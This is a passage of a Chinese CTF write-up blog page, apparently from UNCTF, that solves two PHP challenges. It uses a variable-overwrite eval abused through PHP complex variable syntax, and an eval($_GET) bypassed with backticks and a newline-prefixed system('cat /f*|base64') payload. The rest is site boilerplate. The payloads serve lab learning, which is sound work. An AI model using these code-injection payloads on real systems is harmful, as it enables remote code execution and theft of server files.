+        <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/var\d&#123;1,2&#125;/&#x27;</span>, <span class="hljs-variable">$key</span>) &amp;&amp; strlen(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-variable">$key</span>]) &lt; <span class="hljs-number">12</span>) &#123;
+            @<span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;\$<span class="hljs-subst">$key</span>&quot;</span> . <span class="hljs-string">&#x27;=&quot;&#x27;</span> . <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-variable">$key</span>] . <span class="hljs-string">&#x27;&quot;;&#x27;</span>);
+        &#125;
+    &#125;</code></pre></div>
+
+<ul>
+<li>这段是将设置var开头，后面带1到2个数字变量的值，类似于var1=xxx或者var12=xxx 这样的</li>
+<li>由于变量覆盖的环节限制了单双引号的输入，所以这里的解法为利用php复杂变量getshell</li>
+</ul>
+<p>什么是php复杂变量getshell</p>
+<p>PHP复杂变量</p>
+<p>{}不能被转移，其包裹的部分可当作变量<br>就是${phpinfo()}和{${phpinfo()}}是一样的，花括号{}只是用于区别变量边界的标识符</p>
+<p>payload:</p>
+<div class="hljs"><pre><code class="hljs awk">?source=<span class="hljs-number">1</span>&amp;adminPassword=c4ca4238a0b923820dcc509a6f75849b&amp;password=<span class="hljs-number">1</span>&amp;verif=<span class="hljs-number">0</span>e1290633704&amp;var1=&#123;<span class="hljs-variable">$_GET</span>[<span class="hljs-number">1</span>]&#125;&amp;var3=<span class="hljs-variable">$&#123;$var1()&#125;</span>&amp;<span class="hljs-number">1</span>=phpinfo
+<span class="hljs-regexp">//</span>var1=&#123;phpinfo&#125;  
+<span class="hljs-regexp">//</span>var3=<span class="hljs-variable">$&#123;$var1&#125;</span>=<span class="hljs-variable">$&#123;phpinfo&#125;</span></code></pre></div>
+
+<p>flag藏在phpinfo中，ctrl+f搜素flag即可</p>
+<h2 id="babyeval"><a href="#babyeval" class="headerlink" title="babyeval"></a>babyeval</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+    <span class="hljs-comment">// flag在flag.php</span>
+    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]))&#123;
+        <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/\(.*\)/&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]))
+            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker!!!&#x27;</span>);
+        ob_start(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span>&#123;
+                 <span class="hljs-keyword">if</span> (strpos(<span class="hljs-variable">$data</span>, <span class="hljs-string">&#x27;flag&#x27;</span>) !== <span class="hljs-literal">false</span>)
+                 <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;ByeBye hacker&#x27;</span>;
+                 <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
+                 &#125;);
+        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]);
+    &#125; <span class="hljs-keyword">else</span> &#123;
+        highlight_file(<span class="hljs-keyword">__FILE__</span>);
+    &#125;
+    <span class="hljs-meta">?&gt;</span></code></pre></div>
+
+<p>看下代码</p>
+<blockquote>
+<p>1.get 提交一个参数a</p>
+<p>2.正则过滤，a中不能包含（）</p>
+<p>3.function($data)，这个函数过滤了flag字段，所以不能包含flag</p>
+<p>4.绕过上面两个后就可以执行eval()</p>
+</blockquote>
+<p>可以使用echo配合``绕过上面的检测</p>
+<div class="hljs"><pre><code class="hljs autohotkey">echo `base64 f*`;</code></pre></div>
+
+<p>但是一般想到的应该是</p>
+<div class="hljs"><pre><code class="hljs abnf">system(<span class="hljs-string">&quot;cat /flag.php&quot;</span>)<span class="hljs-comment">;</span></code></pre></div>
+
+<p>可以利用%0a绕过，%0a对应的ascii码为换行符，并且为base64格式显示，不然会被拦截</p>
+<div class="hljs"><pre><code class="hljs ini"><span class="hljs-attr">a</span>=system(<span class="hljs-string">&quot;%0acat /f*|%20base64&quot;</span>)<span class="hljs-comment">;</span></code></pre></div>
+
+
+
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/ctf/">ctf</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/ssrf/">ssrf</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2020/11/27/attack/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">arp attack</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2020/11/15/xss-sql/">
+                        <span class="hidden-mobile">xss和sql注入简单环境的搭建</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+              <!-- Comments -->
+              <article class="comments" id="comments">
+                
+                
+  <div id="vcomments"></div>
+  <script type="text/javascript">
+    function loadValine() {
+      addScript('https://cdn.jsdelivr.net/gh/HCLonely/Valine@latest/dist/Valine.min.js', function () {
+        new Valine({
+          el: "#vcomments",
+          app_id: "2rPljbm5WOxA9BCPXqy3VE5y-gzGzoHsz",
+          app_key: "SCoIn2Qp99a7ITtPhkAi6Chw",
+          placeholder: "说点什么吧~~~",
+          path: window.location.pathname,
+          avatar: "retro",
+          meta: ["nick","mail","link"],
+          pageSize: "10",
+          lang: "zh-CN",
+          highlight: true,
+          recordIP: false,
+          serverURLs: "",
+          master: "4cd096660a71d786a2a4d9d0bb4e8996",
+          friends: "b275f0fc8103331da645a878cf60f841",
+          tagMeta: ["博主","友人","访客"],
+        });
+      });
+    }
+    waitElementVisible('vcomments', loadValine);
+  </script>
+  <noscript>Please enable JavaScript to view the <a target="_blank" href="https://valine.js.org" rel="nofollow noopener noopener">comments
+      powered by Valine.</a></noscript>
+
+
+              </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div id="tocbot"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+  <div class="col-lg-7 mx-auto nopadding-md">
+    <div class="container custom post-content mx-auto">
+      <img src="https://octodex.github.com/images/jetpacktocat.png" srcset="/img/loading.gif" class="rounded mx-auto d-block mt-5" style="width:150px; height:150px;">
+    </div>
+  </div>
+
+
+    
+  </main>
+
+  
+    <a id="scroll-top-button" href="#" role="button">
+      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/main.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+  <script  src="/js/clipboard-use.js" ></script>
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '#post-body',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        collapseDepth: 0,
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc').css('visibility', 'visible');
+      }
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "UNCTF&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: true,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+      icon: "§"
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      searchFunc(path, 'local-search-input', 'local-search-result');
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+  <script>
+    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
+      function () {
+        var element = document.createElement('a');
+        $(element).attr('data-fancybox', 'images');
+        $(element).attr('href', $(this).attr('src'));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+<div class="text-center py-1">   
+  <div>
+    <span>Copyright © 2020</span></a>
+    <a href="http://sunzy.icu/" target="_blank" rel="nofollow noopener">
+     <span>my blog</span></a>    <br>
+  </div>
+<div>
+  <span id="timeDate">载入天数...</span>
+  <span id="times">载入时分秒...</span>
+  <script>
+  var now = new Date();
+  function createtime(){
+      var grt= new Date("03/02/2020 00:00:00");//此处修改你的建站时间或者网站上线时间
+      now.setTime(now.getTime()+250);
+      days = (now - grt ) / 1000 / 60 / 60 / 24;
+      dnum = Math.floor(days);
+      hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum);
+      hnum = Math.floor(hours);
+      if(String(hnum).length ==1 ){
+          hnum = "0" + hnum;
+      }
+      minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+      mnum = Math.floor(minutes);
+      if(String(mnum).length ==1 ){
+                mnum = "0" + mnum;
+      }
+      seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+      snum = Math.round(seconds);
+      if(String(snum).length ==1 ){
+                snum = "0" + snum;
+      }
+      document.getElementById("timeDate").innerHTML = "🚀 for&nbsp"+dnum+"&nbspdays";  //此次自定义显示内容
+      document.getElementById("times").innerHTML = hnum + "&nbsphr&nbsp" + mnum + "&nbspmin&nbsp" + snum + "&nbspsec";
+  }  //此次自定义显示内容
+  setInterval("createtime()",250);
+  </script>
+</div>
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false});</script></body>
+</html>
